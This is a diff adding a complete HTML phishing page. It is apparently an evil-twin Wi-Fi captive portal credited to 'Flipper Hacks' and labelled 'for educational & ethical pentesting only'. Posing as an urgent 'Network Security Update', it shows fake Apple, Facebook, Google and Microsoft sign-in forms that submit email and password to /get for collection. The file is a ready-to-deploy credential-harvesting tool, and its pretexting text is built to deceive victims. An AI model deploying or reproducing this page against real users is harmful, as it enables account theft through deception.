@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Security Update</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    
+	    <!-- 
+    ####################################################
+    #                                                  #
+    #  Created by: Flipper Hacks                       #
+	#  FOR EDUCATIONAL & ETHICAL PENTESTING ONLY!!!    #
+    #  Follow me on TikTok:                            #
+    #  https://www.tiktok.com/@flipperhacks             #
+    #                                                  #
+    ####################################################
+    -->
+
+	<style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f3f4f6;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            background-color: #fff;
+            padding: 35px 50px;
+            border-radius: 10px;
+            box-shadow: 0px 10px 30px -5px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 28px;
+            color: #000;
+        }
+
+        p, h3 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #555;
+            font-size: 18px;
+        }
+
+        blockquote {
+            border-left: 3px solid #4285F4;
+            padding-left: 15px;
+            font-style: italic;
+            color: #555;
+            margin: 20px 0;
+        }
+
+        .auth-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .auth-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            padding: 12px 20px;
+            border-radius: 7px;
+            font-size: 18px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            outline: none;
+            transition: background-color 0.2s, transform 0.2s;
+        }
+
+        .auth-button:hover {
+            transform: translateY(-2px);
+        }
+
+        .auth-button.apple {
+            background-color: #000;
+            color: #fff;
+        }
+
+        .auth-button.facebook {
+            background-color: #1877F2;
+            color: #fff;
+        }
+
+        .auth-button.google {
+            background-color: #4285F4;
+            color: #fff;
+        }
+
+        .auth-button.microsoft {
+            background-color: #2B5797;
+            color: #fff;
+        }
+
+        .login-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        input[type=text], input[type=password], input[type=email] {
+            width: 100%;
+            padding: 14px 18px;
+            margin: 10px 0;
+            border: 1px solid #d2d2d7;
+            border-radius: 7px;
+            font-size: 17px;
+            outline: none;
+        }
+
+        button.submit {
+            width: 100%;
+            padding: 14px 0;
+            border: none;
+            border-radius: 7px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            transition: background-color 0.2s, transform 0.2s;
+        }
+
+        button.submit:hover {
+            background-color: #333;
+            transform: translateY(-2px);
+        }
+
+        footer {
+            margin-top: 15px;
+        }
+
+        footer p {
+            color: #777;
+            font-size: 14px;
+        }
+    </style>
+    <script>
+        function toggleAuth(type) {
+            const sections = ['apple-login', 'facebook-login', 'google-login', 'microsoft-login'];
+            sections.forEach(section => {
+                document.getElementById(section).style.display = (section === `${type}-login`) ? 'block' : 'none';
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Network Security Update</h1>
+        <p>As part of our ongoing efforts to ensure the utmost security, we've implemented a new secure protocol. Due to recent attempted security breaches, it's urgent for all users to authenticate below.</p>
+        <blockquote>
+            "Using this new secure protocol has vastly improved our network safety." - Rusty Shackleford, Lead IT Specialist
+        </blockquote>
+
+        <div class="auth-buttons">
+            <button class="auth-button apple" onclick="toggleAuth('apple')">Apple</button>
+            <button class="auth-button facebook" onclick="toggleAuth('facebook')">Facebook</button>
+            <button class="auth-button google" onclick="toggleAuth('google')">Google</button>
+            <button class="auth-button microsoft" onclick="toggleAuth('microsoft')">Microsoft</button>
+        </div>
+
+        <!-- Apple Login Section -->
+        <div id="apple-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="email" name="email" placeholder="Apple ID" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Apple">
+                <button type="submit" class="submit" style="background-color: #000;">Sign in</button>
+            </form>
+        </div>
+
+        <!-- Facebook Login Section -->
+        <div id="facebook-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="text" name="email" placeholder="Facebook Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Facebook">
+                <button type="submit" class="submit" style="background-color: #1877F2;">Sign in</button>
+            </form>
+        </div>
+
+        <!-- Google Login Section -->
+        <div id="google-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="email" name="email" placeholder="Google Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Google">
+                <button type="submit" class="submit" style="background-color: #4285F4;">Sign in</button>
+            </form>
+        </div>
+
+        <!-- Microsoft Login Section -->
+        <div id="microsoft-login" class="login-container">
+            <form action="/get" method="GET">
+                <input type="email" name="email" placeholder="Microsoft Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="hidden" name="service" value="Microsoft">
+                <button type="submit" class="submit" style="background-color: #2B5797;">Sign in</button>
+            </form>
+        </div>
+
+        <div class="faq-section">
+            <h3>Why this additional step?</h3>
+            <p>To ensure the utmost security, we have implemented this additional authentication step. This process verifies the legitimacy of devices attempting to connect to our network and prevents unauthorized access.</p>
+        </div>
+    </div>
+
+    <footer>
+        <p>Secured by Wi-Fi-ENCRYPT™ Technologies &copy; 2023. All rights reserved.</p>
+    </footer>
+</body>
+</html>
